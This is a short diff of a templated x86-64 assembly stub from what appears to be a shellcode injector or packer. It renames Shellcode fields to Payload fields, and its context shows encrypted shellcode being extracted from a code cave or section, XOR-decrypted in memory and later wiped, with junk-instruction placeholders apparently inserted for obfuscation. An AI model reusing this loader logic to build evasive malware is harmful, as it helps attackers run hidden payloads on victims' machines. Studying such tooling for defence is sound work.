@@ -319,7 +319,7 @@ entry:
 {{if .CodeCave}}
   // extract encrypted shellcode from code cave
   push {{.RegN.rdi}}                           {{igi}} // save "rdi" for execute shellcode
-  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}     {{igi}} // key of encrypted shellcode
+  mov {{.RegN.rbx}}, {{hex .PayloadKey}}       {{igi}} // key of encrypted shellcode
   mov {{.RegN.rdi}}, [rsp+0x10]                {{igi}} // address of allocated memory page
   add {{.RegN.rdi}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   {{STUB CodeCaveMode STUB}}
@@ -333,10 +333,10 @@ entry:
 
   // extract encrypted shellcode from section
   mov rsi, {{.RegN.rdi}}                       {{igi}} // address of image base
-  add rsi, {{hex .ShellcodeOffset}}            {{igi}} // address of encrypted shellcode
+  add rsi, {{hex .PayloadOffset}}              {{igi}} // address of encrypted shellcode
   mov rdi, [rsp+0x18]                          {{igi}} // address of allocated memory page
   add rdi, {{hex .EntryOffset}}                {{igi}} // address of shellcode
-  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
+  mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
  loop_extract:
   movsb                                        {{igi}}
   inc rsi                                      {{igi}}
@@ -345,10 +345,10 @@ entry:
   jnz loop_extract                             {{igi}}
 
   // decrypt shellcode in the memory page
-  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}     {{igi}} // key of encrypted shellcode
+  mov {{.RegV.rax}}, {{hex .PayloadKey}}       {{igi}} // key of encrypted shellcode
   mov {{.RegV.rdx}}, [rsp+0x18]                {{igi}} // address of allocated memory page
   add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
-  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
+  mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
  loop_decrypt:
   mov {{.RegV.r8}}, [{{.RegV.rdx}}]            {{igi}}
   xor {{.RegV.r8}}, {{.RegV.rax}}              {{igi}}
@@ -415,7 +415,7 @@ entry:
   // overwrite memory data
   mov {{.RegV.rdx}}, [rsp+0x08]                {{igi}} // address of memory page
   add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
-  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
+  mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
   sub {{.RegV.rcx}}, 7                         {{igi}} // adjust loop times
   // calculate a random seed from registers
   add {{.RegV.rax}}, rsp                       {{igi}}
